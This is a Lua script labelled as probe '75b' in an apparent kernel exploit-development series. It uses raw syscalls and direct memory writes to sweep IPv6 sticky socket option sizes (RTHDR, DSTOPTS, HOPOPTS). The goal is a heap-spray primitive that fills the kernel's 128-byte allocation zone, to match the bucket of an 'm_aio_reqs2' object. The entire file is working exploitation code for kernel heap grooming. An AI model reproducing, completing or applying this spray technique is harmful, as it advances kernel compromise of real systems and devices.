-- CRASH_CLASS: LOW
-- PROBE 75b: IPv6 sticky option size sweep — find max accepted size per option type
--
-- Context: 75a failed at optlen=120 because it used proto=0. 76a proved RTHDR
-- works at 24/40/56 with proto=17 and correct segleft=(size-8)/16.
-- We need zone 128 (optlen≈120) to match m_aio_reqs2's 0x80 bucket.
--
-- Tests RTHDR, DSTOPTS, HOPOPTS with proto=17 at sizes 24,40,56,72,88,104,120
-- with tag roundtrip verification via getsockopt.

print("=== PROBE 75b: IPv6 spray size sweep ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function call(sc, ...)
    local ok, val = pcall(sc, ...)
    if not ok then return -999 end
    return N(val)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function wb(addr, value) memory.write_byte(addr, value) end
local function rb(addr) return N(memory.read_byte(addr)) end
local function wd(addr, value) memory.write_dword(addr, value) end
local function rd(addr) return N(memory.read_dword(addr)) end

local socket   = mk(97)
local setsock  = mk(105)
local getsock  = mk(118)
local close_sc = mk(6)
local buf      = memory.alloc(256)
local out      = memory.alloc(256)
local outlen   = memory.alloc(8)

local IPPROTO_IPV6  = 41
local IPV6_RTHDR    = 51
local IPV6_DSTOPTS  = 50
local IPV6_HOPOPTS  = 49

local TAG = 0xCAFE0000

local SIZES = {24, 40, 56, 72, 88, 104, 120}

local opt_names = {
    [IPV6_RTHDR]   = "RTHDR",
    [IPV6_DSTOPTS] = "DSTOPTS",
    [IPV6_HOPOPTS] = "HOPOPTS",
}

-- Build properly formatted ext header for each option type
local function build_rthdr(size, tag)
    for i = 0, size - 1 do wb(N(buf) + i, 0) end
    wb(N(buf),     0)                  -- next header (ignored for sticky)
    wb(N(buf) + 1, size / 8 - 1)      -- hdr ext len
    wb(N(buf) + 2, 0)                  -- routing type 0
    wb(N(buf) + 3, (size - 8) / 16)   -- segleft
    wd(N(buf) + 8, tag)               -- tag at offset 8
end

local function build_opts(size, tag)
    -- DSTOPTS/HOPOPTS: header(2) + PadN TLV covering the rest
    for i = 0, size - 1 do wb(N(buf) + i, 0) end
    wb(N(buf),     0)                  -- next header
    wb(N(buf) + 1, size / 8 - 1)      -- hdr ext len
    -- Single PadN TLV: type=1, len=size-4, data=size-4 bytes
    wb(N(buf) + 2, 1)                  -- PadN type
    wb(N(buf) + 3, size - 4)           -- PadN data length
    wd(N(buf) + 8, tag)               -- tag inside PadN data
end

-- Also try multi-PadN: chain of smaller PadN TLVs
local function build_opts_multi(size, tag)
    for i = 0, size - 1 do wb(N(buf) + i, 0) end
    wb(N(buf),     0)                  -- next header
    wb(N(buf) + 1, size / 8 - 1)      -- hdr ext len
    -- Fill bytes 2..(size-1) with PadN TLVs
    local pos = 2
    local tag_placed = false
    while pos < size do
        local remain = size - pos
        if remain == 1 then
            wb(N(buf) + pos, 0)        -- Pad1 (single byte)
            pos = pos + 1
        elseif remain >= 2 then
            local dlen = remain - 2    -- max data for this PadN
            if dlen > 252 then dlen = 252 end  -- keep it sane
            wb(N(buf) + pos, 1)        -- PadN type
            wb(N(buf) + pos + 1, dlen) -- PadN data len
            -- Place tag in first PadN that has room
            if not tag_placed and dlen >= 6 then
                wd(N(buf) + pos + 2 + 4, tag) -- tag at +6 into PadN data
                tag_placed = true
            end
            pos = pos + 2 + dlen
        end
    end
    -- Also place tag at absolute offset 8 if space
    if size > 12 then
        wd(N(buf) + 8, tag)
    end
end

local function test_option(opt, size, tag, build_fn)
    build_fn(size, tag)
    local fd = sgn(call(socket, uint64(28), uint64(2), uint64(17)))
    if fd < 0 then return -1, -1, 0, 0 end

    local setrv = sgn(call(setsock, uint64(fd), uint64(IPPROTO_IPV6),
        uint64(opt), uint64(N(buf)), uint64(size)))

    for i = 0, size - 1 do wb(N(out) + i, 0xCC) end
    wd(N(outlen), 256)
    local getrv = sgn(call(getsock, uint64(fd), uint64(IPPROTO_IPV6),
        uint64(opt), uint64(N(out)), uint64(N(outlen))))
    local got_len = rd(N(outlen))
    local got_tag = rd(N(out) + 8)

    call(close_sc, uint64(fd))
    return setrv, getrv, got_len, got_tag
end

-- =========================================================
-- [A] RTHDR sweep (76a format — known working at 24/40/56)
-- =========================================================
print("[A] IPV6_RTHDR (type=0, segleft=(size-8)/16)")
local rthdr_max = 0
for _, size in ipairs(SIZES) do
    local sr, gr, gl, gt = test_option(IPV6_RTHDR, size, TAG + size, build_rthdr)
    local match = (gt == TAG + size) and "TAG-OK" or string.format("tag=%08X", gt)
    print(string.format("  size=%3d: set=%2d get=%2d len=%3d %s",
        size, sr, gr, gl, match))
    if sr == 0 and gr == 0 and gt == TAG + size then
        rthdr_max = size
    end
end
print("  RTHDR max accepted: " .. rthdr_max)

-- =========================================================
-- [B] DSTOPTS sweep (single PadN TLV)
-- =========================================================
print("")
print("[B] IPV6_DSTOPTS (single PadN TLV)")
local dstopts_max = 0
for _, size in ipairs(SIZES) do
    local sr, gr, gl, gt = test_option(IPV6_DSTOPTS, size, TAG + size, build_opts)
    local match = (gt == TAG + size) and "TAG-OK" or string.format("tag=%08X", gt)
    print(string.format("  size=%3d: set=%2d get=%2d len=%3d %s",
        size, sr, gr, gl, match))
    if sr == 0 and gr == 0 and gt == TAG + size then
        dstopts_max = size
    end
end
print("  DSTOPTS max accepted: " .. dstopts_max)

-- =========================================================
-- [C] HOPOPTS sweep (single PadN TLV)
-- =========================================================
print("")
print("[C] IPV6_HOPOPTS (single PadN TLV)")
local hopopts_max = 0
for _, size in ipairs(SIZES) do
    local sr, gr, gl, gt = test_option(IPV6_HOPOPTS, size, TAG + size, build_opts)
    local match = (gt == TAG + size) and "TAG-OK" or string.format("tag=%08X", gt)
    print(string.format("  size=%3d: set=%2d get=%2d len=%3d %s",
        size, sr, gr, gl, match))
    if sr == 0 and gr == 0 and gt == TAG + size then
        hopopts_max = size
    end
end
print("  HOPOPTS max accepted: " .. hopopts_max)

-- =========================================================
-- [D] If single PadN failed at 120, try multi-PadN for DSTOPTS
-- =========================================================
if dstopts_max < 120 then
    print("")
    print("[D] IPV6_DSTOPTS with multi-PadN TLV encoding")
    for _, size in ipairs(SIZES) do
        local sr, gr, gl, gt = test_option(IPV6_DSTOPTS, size, TAG + size, build_opts_multi)
        local match = (gt == TAG + size) and "TAG-OK" or string.format("tag=%08X", gt)
        print(string.format("  size=%3d: set=%2d get=%2d len=%3d %s",
            size, sr, gr, gl, match))
    end
end

-- =========================================================
-- [E] Fine-grain sweep around largest working size
-- =========================================================
print("")
print("[E] Fine-grain sweep")
local best_opt = nil
local best_max = 0
if rthdr_max >= dstopts_max and rthdr_max >= hopopts_max then
    best_opt = IPV6_RTHDR; best_max = rthdr_max
elseif dstopts_max >= hopopts_max then
    best_opt = IPV6_DSTOPTS; best_max = dstopts_max
else
    best_opt = IPV6_HOPOPTS; best_max = hopopts_max
end

if best_max > 0 and best_max < 120 then
    print("Best so far: " .. opt_names[best_opt] .. " max=" .. best_max)
    -- Try sizes between best_max and next step up, in 8-byte increments
    local build_fn = (best_opt == IPV6_RTHDR) and build_rthdr or build_opts
    local fine_max = best_max
    for probe_size = best_max + 8, 128, 8 do
        local sr, gr, gl, gt = test_option(best_opt, probe_size, TAG + probe_size, build_fn)
        local match = (gt == TAG + probe_size) and "TAG-OK" or string.format("tag=%08X", gt)
        print(string.format("  %s size=%3d: set=%2d get=%2d len=%3d %s",
            opt_names[best_opt], probe_size, sr, gr, gl, match))
        if sr == 0 and gr == 0 and gt == TAG + probe_size then
            fine_max = probe_size
        else
            break  -- stop at first failure
        end
    end
    print("  Fine-grain max: " .. fine_max)
elseif best_max >= 120 then
    print("GOOD: " .. opt_names[best_opt] .. " accepts " .. best_max .. " bytes (zone 128)")
    -- Also check 128 (exact zone boundary)
    local build_fn = (best_opt == IPV6_RTHDR) and build_rthdr or build_opts
    local sr, gr, gl, gt = test_option(best_opt, 128, TAG + 128, build_fn)
    local match = (gt == TAG + 128) and "TAG-OK" or string.format("tag=%08X", gt)
    print(string.format("  %s size=128: set=%2d get=%2d len=%3d %s",
        opt_names[best_opt], sr, gr, gl, match))
else
    print("NO OPTION WORKS AT ANY SIZE with proto=17")
end

-- =========================================================
-- [F] Summary
-- =========================================================
print("")
print("=== SUMMARY ===")
print("  RTHDR   max: " .. rthdr_max)
print("  DSTOPTS max: " .. dstopts_max)
print("  HOPOPTS max: " .. hopopts_max)
if best_max >= 120 then
    print("  SPRAY CANDIDATE: " .. opt_names[best_opt] .. " at optlen=120 (zone 128)")
elseif best_max >= 56 then
    print("  PARTIAL: " .. opt_names[best_opt] .. " caps at " .. best_max .. " (zone " .. best_max .. ")")
    print("  Need alternative spray for zone 128")
else
    print("  BLOCKED: no IPv6 option reaches zone 128")
end

print("")
print("=== PROBE 75b COMPLETE ===")
